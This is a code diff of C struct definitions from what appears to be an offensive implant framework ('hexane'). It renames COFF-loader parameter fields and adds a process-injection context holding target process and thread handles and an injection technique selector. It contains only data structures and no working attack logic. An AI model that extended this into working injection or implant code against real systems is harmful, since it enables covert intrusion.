@@ -271,9 +271,9 @@ struct _coff_symbol {
 
 struct _coff_params {
 	PCHAR  entrypoint;
-	DWORD  entrypoint_length;
+	DWORD  entrypoint_size;
 	PVOID  data;
-	SIZE_T data_length;
+	SIZE_T data_size;
 	PVOID  args;
 	SIZE_T args_size;
 	UINT32 task_id;
@@ -283,6 +283,21 @@ struct _reloc {
 	UINT32 VirtualAddress;
 	UINT32 SymbolTableIndex;
 	UINT16 Type;
+};
+
+struct _injection_ctx {
+	HANDLE  process;
+	DWORD   tid;
+	DWORD   pid;
+	HANDLE  thread;
+	SHORT   arch;
+	BOOL    b_stdout;
+
+	BOOL    suspend_awake;
+	LPVOID  parameter;
+	UINT32  parameter_size;
+
+	SHORT   Technique;
 };
 
 struct _executable {
@@ -445,6 +460,7 @@ struct _hexane{
 	LPVOID 	heap;
 	BOOL 	root;
     BOOL   	little;
+	DWORD 	threads;
 	_executable *coffs;
 	_client 	*clients;
 
